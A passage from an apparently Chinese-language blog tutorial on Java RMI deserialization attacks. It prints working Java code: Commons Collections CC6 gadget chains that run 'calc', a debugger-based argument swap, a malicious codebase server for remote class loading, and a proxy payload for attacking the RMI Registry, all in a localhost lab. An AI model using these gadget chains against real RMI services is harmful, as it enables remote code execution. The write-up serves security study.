class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">package Client;</span><br><span class="line"></span><br><span class="line">import Server.SayHelloInterface;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.rmi.NotBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC6Test &#123;</span><br><span class="line">    public static Object getEvilClass() throws NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        // 获取包含执行类的 ChainedTransformer 对象</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                // 将传入参数固定为 Runtime.class</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        // 新建一个 Map 对象，无关紧要，只是作为参数传入</span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 LazyMap</span><br><span class="line">        Map lazymap = LazyMap.decorate(hashMap, new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 TiedMapEntry ，第二个参数为 key 值，先随便传一个</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, &quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 HashMap</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(tiedMapEntry, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        // 删除 lazymap 对象中的 key 值</span><br><span class="line">        lazymap.remove(&quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 反射修改 lazymap 对象的 factory 属性</span><br><span class="line">        Class&lt;? extends Map&gt; lazymapClass = lazymap.getClass();</span><br><span class="line">        Field factory = lazymapClass.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        factory.set(lazymap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        return map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws RemoteException, NotBoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        // 连接到服务器 localhost ，端口 1099 :</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);</span><br><span class="line">        // 查找名称为 &quot;SayHello&quot; 的服务并强制转型为 SayHelloInterface 类型:</span><br><span class="line">        SayHelloInterface sayHello = (SayHelloInterface) registry.lookup(&quot;SayHello&quot;);</span><br><span class="line">        // 将构造好的 HashMap 对象作为参数传入</span><br><span class="line">        sayHello.eval(getEvilClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先启动服务端，然后启动客户端，弹出计算器：</p><img src="/images/image-20240708165345974.png"><p>参数为 Object 类型就可以传递任意参数，那如果不是 Object 类型呢？</p><p>前面提到客户端调用服务方法时是直接与服务端进行通信的，而服务端使用 UnicastServerRef 的 dispatch 方法来处理客户端的请求。</p><p>在查找方法时，它用方法的 hash 值在 this.hashToMethod_Map 中查找。这个 hash 实际上是一个基于方法签名的 SHA1 hash 值。</p><img src="/images/image-20240708171013758.png"><p>如果说服务的参数不是 Object 类型，但是我们想上传恶意类的话，理论上可以伪造 hash ，这个 hash 在服务端是可以找到对应的方法的，但是实际传递的方法的参数还是恶意类。</p><p>在 mogwailabs 的 [PPT](<a href="https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides">https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides</a> Exploiting RMI Services.pdf) 中提出了以下 4 种方法：</p><ul><li>通过网络代理，在流量层修改数据</li><li>自定义 “java.rmi” 包的代码，自行实现</li><li>字节码修改</li><li>使用 debugger</li></ul><p>我们来实现一下使用 debugger 的攻击方式，也就是在调试时修改变量值。</p><h6 id="调试时修改变量值"><a href="#调试时修改变量值" class="headerlink" title="调试时修改变量值"></a>调试时修改变量值</h6><p>现在将服务端的方法参数改为 String 类型：</p><img src="/images/image-20240709141401511.png"><p>客户端定义了一个 getEvilClass() 方法用来获取 CC6 攻击链最终的 HashMap 对象。</p><p>客户端在调用时先传入一个普通的字符串：</p><img src="/images/image-20240709145850132.png"><p>运行服务端，调试客户端，在 RemoteObjectInvocationHandler 的 invokeRemoteMethod 方法处下断点。</p><p>此时我们进入到 RemoteObjectInvocationHandler 的 invokeRemoteMethod 方法，这里的 method 表示要调用的方法，args 是一个 Object 数组，表示要传递的参数：</p><img src="/images/image-20240709150236473.png"><p>其中 args[0] 正是我们传递的字符串参数，我们将其改为恶意对象，可以在上图红框处右键 -&gt; Set Value ：</p><img src="/images/image-20240709150345553.png"><p>然后设置 args[0] &#x3D; CC6Test.getEvilClass() 即可：</p><img src="/images/image-20240709150424485.png"><p>这样就成功修改了 args[0] 为恶意类，继续运行，可以看到弹出计算器：</p><img src="/images/image-20240709150721649.png"><p>因为调用的是本地的 RemoteObjectInvocationHandler 的 invokeRemoteMethod 方法，所以在参数传递到服务端之前就修改了它，要查找的方法又没变，最终得出的 hash 值在服务端又能找到对应的方法，所以造成了参数反序列化。</p><p>实际上，服务端调用 UnicastServerRef 的 dispatch 方法来处理客户端的请求，UnicastServerRef 的 dispatch 方法又调用 UnicastRef 的 unmarshalValue 方法来反序列化参数：</p><img src="/images/image-20240709151401926.png"><p>服务端实际反序列化参数的处理在 UnicastRef 的 unmarshalValue 方法中：</p><img src="/images/image-20240709151518462.png"><p>可以看到，除了基本类型之外，其他类型的参数都会在这里被反序列化，所以只要服务端提供的方法参数不是基本类型，理论上都可以用这么一种攻击方式。</p><h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>这种方式虽然可行，但也存在一定的局限性：</p><ol><li>反序列化攻击，要求服务端有可利用的反序列化链，比如 CC 依赖；</li><li>实际应用场景中，攻击者并不知道 RMI 服务端提供了哪些方法，方法的参数是什么类型，攻击者也许可以通过工具探测得到服务的名称，但还是无法利用。除非得到源码，当然在这种情况下，攻击者通常会优先选用其他攻击方式了。</li></ol><h4 id="动态类加载"><a href="#动态类加载" class="headerlink" title="动态类加载"></a>动态类加载</h4><p>RMI 有一个重要的特性，就是动态类加载机制，当本地 ClassPath 中无法找到相应的类时，会在指定的 codebase 里加载 class。</p><p>若要开启动态类加载，服务端需要满足以下几个条件：</p><ol><li>需要启动 RMISecurityManager 。Java SecurityManager 默认不允许远程类加载。</li><li>需要配置 java.security.policy 。</li><li>属性 java.rmi.server.useCodebaseOnly 的值必须为 false 。但是 JDK 6u45、7u21 之后，java.rmi.server.useCodebaseOnly 的默认值是 true 。当该值为 true 时，将禁用自动加载远程类文件，仅从 CLASSPATH 和当前虚拟机的 java.rmi.server.codebase 指定路径加载类文件，不再支持从 RMI 请求中获取 codebase 。增加了 RMI ClassLoader 的安全性。</li></ol><p>我们来模拟攻击一下，由于客户端和服务端都在本地，故为了防止远程类与服务端在一起，我们将该实验分为三个项目：</p><p>第一个项目名为 remote-class ，这个项目中实现了一个简易的服务器，并且其中存放远程类，将来作为 codebase 使用；</p><p>第二个项目名为 java-rmi-server ，RMI 的服务端和注册中心所在的项目；</p><p>第三个项目名为 java-rmi-client ，RMI 客户端所在的项目。</p><p>注：本次实验代码基于 <a href="https://github.com/longofo">longofo</a> 师傅的代码改编。仓库链接为：<a href="https://github.com/longofo/rmi-jndi-ldap-jrmp-jmx-jms">https://github.com/longofo/rmi-jndi-ldap-jrmp-jmx-jms</a></p><p>改编后的代码存放在：<a href="https://github.com/ChangeYourWay/RemoteRmiTest">https://github.com/ChangeYourWay/RemoteRmiTest</a> ，在 jdk8u71 环境中试验成功。 </p><p>其中，要被加载的远程类名为 ExportObject ，我们先来确保客户端和服务端都是访问不到这个类的：</p><p>服务端并不存在 ExportObject 类，所以无法访问：</p><img src="/images/QQ_1721211770043.png"><p>客户端自定义了一个 ExportObject 类，其中没有恶意代码。这是为了方便客户端使用这个类名（理论上可以直接将远程类复制到客户端，但是这会导致客户端创建对象时，恶意代码先在客户端中执行一遍）：</p><img src="/images/QQ_1721211872446.png"><p>真正的远程类在 remote-class 项目中：</p><img src="/images/QQ_1721211268503.png"><p>客户端和 codebase 处的远程类控制序列化版本号一致，避免反序列化失败。</p><p>服务端代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// RMIServer2.java</span><br><span class="line">package com.miaoji.javarmi;</span><br><span class="line"></span><br><span class="line">import java.rmi.RMISecurityManager;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class RMIServer &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                // 配置 java.security.policy</span><br><span class="line">                System.setProperty(&quot;java.security.policy&quot;, RMIServer.class.getClassLoader().getResource(&quot;policyfile.txt&quot;).toString());</span><br><span class="line">                // 配置 Java SecurityManager</span><br><span class="line">                System.setSecurityManager(new RMISecurityManager());</span><br><span class="line">                // 设置 java.rmi.server.useCodebaseOnly 为 false</span><br><span class="line">                System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;, &quot;false&quot;);</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 创建 Registry</span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">            // 实例化服务端远程对象</span><br><span class="line">            ServicesImpl obj = new ServicesImpl();</span><br><span class="line">            // 没有继承 UnicastRemoteObject 时需要使用静态方法 exportObject 处理</span><br><span class="line">            Services services = (Services) UnicastRemoteObject.exportObject(obj, 0);</span><br><span class="line">            // 绑定远程对象到 Registry</span><br><span class="line">            registry.rebind(&quot;Services&quot;, services);</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;java RMI registry created. port on 1099...&quot;);</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>值得注意的是 java.security.policy 需要在 Java SecurityManager 之前配置，否则会报拒绝访问的错误：</p><img src="/images/QQ_1721212058559.png"><p>Services 接口的方法参数是 Message 类型，Message 是服务端自定义的类：</p><img src="/images/QQ_1721213910927.png"><p>客户端代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package com.miaoji.javarmi;</span><br><span class="line"></span><br><span class="line">import com.miaoji.remoteclass.ExportObject;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class RMIClient &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://127.0.0.1:8000/&quot;);</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);</span><br><span class="line">        // 获取远程对象的引用</span><br><span class="line">        Services services = (Services) registry.lookup(&quot;Services&quot;);</span><br><span class="line">        ExportObject exportObject = new ExportObject();</span><br><span class="line">        exportObject.setMessage(&quot;hahaha&quot;);</span><br><span class="line"></span><br><span class="line">        services.sendMessage(exportObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由客户端设置好 codebase 然后传递给服务端。codebase 在客户端和服务端是流动共享的。</p><p>客户端的 ExportObject 类继承了服务端的原有类 Message ，这样才能顺利作为 Services 服务的 sendMessage 方法的参数传输，事实上，如果这里的方法参数是其他类型，比如 ArrayList 类型，那么同样可以让这个 ExportObject 继承 ArrayList 。</p><p>codebase 端代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">package com.miaoji.remoteclass;</span><br><span class="line"></span><br><span class="line">import com.sun.net.httpserver.HttpExchange;</span><br><span class="line">import com.sun.net.httpserver.HttpHandler;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.net.InetSocketAddress;</span><br><span class="line"></span><br><span class="line">public class HttpServer implements HttpHandler &#123;</span><br><span class="line">    public void handle(HttpExchange httpExchange) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            System.out.println(&quot;new http request from &quot; + httpExchange.getRemoteAddress() + &quot; &quot; + httpExchange.getRequestURI());</span><br><span class="line">            InputStream inputStream = HttpServer.class.getResourceAsStream(httpExchange.getRequestURI().getPath());</span><br><span class="line">            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">            while (inputStream.available() &gt; 0) &#123;</span><br><span class="line">                byteArrayOutputStream.write(inputStream.read());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            byte[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">            httpExchange.sendResponseHeaders(200, bytes.length);</span><br><span class="line">            httpExchange.getResponseBody().write(bytes);</span><br><span class="line">            httpExchange.close();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        com.sun.net.httpserver.HttpServer httpServer = com.sun.net.httpserver.HttpServer.create(new InetSocketAddress(8000), 0);</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;String HTTP Server on port: 8000&quot;);</span><br><span class="line">        httpServer.createContext(&quot;/&quot;, new HttpServer());</span><br><span class="line">        httpServer.setExecutor(null);</span><br><span class="line">        httpServer.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要是开启一个 HTTP 服务器，监听 8000 端口。这段代码运行后是可以在公网访问到当前机器的 8000 端口的。它会设置当前项目的根路径为网站根路径：</p><img src="/images/QQ_1721212591316.png"><p>确保 remote-class 中包含了远程类，先运行 codebase 端，再运行服务端，最后运行客户端，成功弹出计算器：</p><img src="/images/QQ_1721212763834.png"><p>由于服务端和客户端并不能直接访问远程类，所以这个是服务端远程加载类的结果。</p><h6 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h6><p>动态类加载的方式限制很多，需要服务器做安全策略文件配置，设置安全管理器，以及存在 Jdk 版本的限制，需要服务器手动设置 useCodebaseOnly 为 false 。除此之外，这种方式仍然需要知道 RMI 服务提供了哪些方法，方法的参数类型是什么。所以仍然比较鸡肋。</p><h4 id="本地重写类"><a href="#本地重写类" class="headerlink" title="本地重写类"></a>本地重写类</h4><p>大致就是如果 RMI 服务的方法参数是某个类，比如 A 类，那么我依然想利用 CC6 链，可以在本地重写 HashMap，让 HashMap 继承 A 类，然后将 CC6 最终得到的 HashMap 对象作为参数传入。</p><p>理论上可以在本地找到 HashMap 的类文件直接修改：</p><img src="/images/QQ_1721216307557.png"><p>但是这样可能出现各种报错，或者是遇到一个类不能直接继承多个类的问题。</p><h3 id="攻击-Registry-端"><a href="#攻击-Registry-端" class="headerlink" title="攻击 Registry 端"></a>攻击 Registry 端</h3><p>考虑服务端和 Registry 端不在同一端的情况，前面分析过了，服务端调用 bind&#x2F;rebind 方法绑定服务对象的时候是将该对象序列化发送到 Registry 端，Registry 端最终在 RegistryImpl_Skel 的 dispatch 方法中反序列化。那么如果 Server 端向 Registry 端输送一个恶意的对象，就可以实现反序列化攻击了。</p><p>考虑到 Server 端绑定对象时要求对象继承 Remote 类，我们创建一个继承了 Remote 类的动态代理即可，创建代理选择使用 AnnotationInvocationHandler 类。并将 getEvilClass() 返回的 HashMap 对象封装进去。AnnotationInvocationHandler 正是 CC1 链的入口类。</p><p>测试代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">package Server;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.management.remote.rmi.RMIServer;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.rmi.RMISecurityManager;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class RemoteServer &#123;</span><br><span class="line"></span><br><span class="line">    public static HashMap getEvilClass() throws NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        // 获取包含执行类的 ChainedTransformer 对象</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                // 将传入参数固定为 Runtime.class</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        // 新建一个 Map 对象，无关紧要，只是作为参数传入</span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 LazyMap</span><br><span class="line">        Map lazymap = LazyMap.decorate(hashMap, new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 TiedMapEntry ，第二个参数为 key 值，先随便传一个</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, &quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 HashMap</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(tiedMapEntry, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        // 删除 lazymap 对象中的 key 值</span><br><span class="line">        lazymap.remove(&quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 反射修改 lazymap 对象的 factory 属性</span><br><span class="line">        Class&lt;? extends Map&gt; lazymapClass = lazymap.getClass();</span><br><span class="line">        Field factory = lazymapClass.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        factory.set(lazymap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        return map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 将 RMI 服务注册到 1099 端口</span><br><span class="line">        LocateRegistry.createRegistry(1099);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        HashMap map = getEvilClass();</span><br><span class="line">        HashMap map1 = new HashMap&lt;&gt;();</span><br><span class="line">        map1.put(&quot;a&quot;, map);</span><br><span class="line"></span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map1);</span><br><span class="line"></span><br><span class="line">        Remote remote = (Remote) Proxy.newProxyInstance(</span><br><span class="line">                RemoteServer.class.getClassLoader(),</span><br><span class="line">                new Class[]&#123;Remote.class&#125;,</span><br><span class="line">                invocationHandler);</span><br><span class="line"></span><br><span class="line">        // Get the registry from a remote host</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);</span><br><span class="line">        // Bind the remote object in the registry</span><br><span class="line">        registry.rebind(&quot;Evil&quot;, remote);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="攻击-Client-端"><a href="#攻击-Client-端" class="headerlink" title="攻击 Client 端"></a>攻击 Client 端</h3><p>这部分场景比较少，如果说 Server 端和 Registry 端可控，那么只需要绑定一个恶意对象，那么客户端一旦远程加载了，就会反序列化这个对象并造成代码执行。</p><p>比如服务端定义一个恶意对象：</p><img src="/images/QQ_1721632318859.png"><p>然后服务端绑定这个恶意对象。</p><p>客户端远程加载此对象并调用其 function 方法时就会造成命令执行：</p><img src="/images/QQ_1721632447996.png"><p>也可以将命令写在静态代码块里面，不过那样会让服务端也执行一次命令。</p><p>除此之外，服务端也可以指定一个 codebase 让客户端去指定的地址加载恶意对象，从而触发客户端反序列化。</p><p>综合来看，攻击 Client 端这部分估计只有钓鱼的场景了。</p><h3 id="分布式垃圾回收-DGC"><a href="#分布式垃圾回收-DGC" class="headerlink" title="分布式垃圾回收 DGC"></a>分布式垃圾回收 DGC</h3><h4 id="了解分布式垃圾回收"><a href="#了解分布式垃圾回收" class="headerlink" title="了解分布式垃圾回收"></a>了解分布式垃圾回收</h4><p>RMI 子系统实现基于引用计数的“分布式垃圾回收”（DGC，Distributed Garbage Collection），以便为远程服务器对象提供自动内存管理设施。启动一个 RMI 服务，就会伴随着启动 DGC 服务端。</p><h6 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h6><ol><li><strong>引用计数</strong>：<ul><li>当客户端获取远程对象的引用时，客户端向服务器发送一个“引用添加”消息，增加该远程对象的引用计数。</li><li>当客户端不再需要远程对象时，客户端向服务器发送一个“引用移除”消息，减少该远程对象的引用计数。</li><li>服务器根据引用计数判断该远程对象是否仍然被引用，如果引用计数为 0 ，则可以回收该对象。</li></ul></li><li><strong>租约机制</strong>：<ul><li>为了防止客户端异常退出或网络分区导致引用计数永久不减的情况，RMI 引入了租约机制。</li><li>当客户端获取远程对象引用时，除了增加引用计数外，还会请求一个租约（Lease）。租约有一个固定的期限，通常是 10 分钟。</li><li>客户端需要在租约到期前续约，以维持对远程对象的引用。如果客户端没有续约，服务器会认为客户端不再需要该对象，并减少引用计数。</li></ul></li><li><strong>垃圾回收器（GC）线程</strong>：<ul><li>服务器中运行一个 GC 线程，负责定期检查所有远程对象的引用计数和租约状态。</li><li>如果发现某个远程对象的引用计数为 0 且租约已过期，则回收该对象。</li></ul></li></ol><h6 id="涉及的接口和方法"><a href="#涉及的接口和方法" class="headerlink" title="涉及的接口和方法"></a>涉及的接口和方法</h6><p>RMI 定义了一个 java.rmi.dgc.DGC 接口，提供了两个方法 dirty 和 clean：</p><ul><li>当客户机创建（序列化）远程引用时，会在服务器端 DGC 上调用 dirty() 方法，请求一个租约，表示远程对象的使用期限。如果客户端想续租，则需要再调用一次 dirty() 方法。</li><li>当客户机完成远程引用后，它会调用对应的 clean() 方法回收远程对象的引用。</li></ul><p>DGC 接口有两个实现类，分别是 sun.rmi.transport.DGCImpl 以及 sun.rmi.transport.DGCImpl_Stub ，同时还定义了 sun.rmi.transport.DGCImpl_Skel 。</p><p>这个命名方式与之前的注册中心类似，实际上功能也是类似。正如 RegistryImpl_Skel 是注册中心自己保留的骨架（代理对象），而 RegistryImpl_Stub 是用来分发出去保留在远程客户端和服务端的存根，DGC 也一样，DGCImpl_Skel 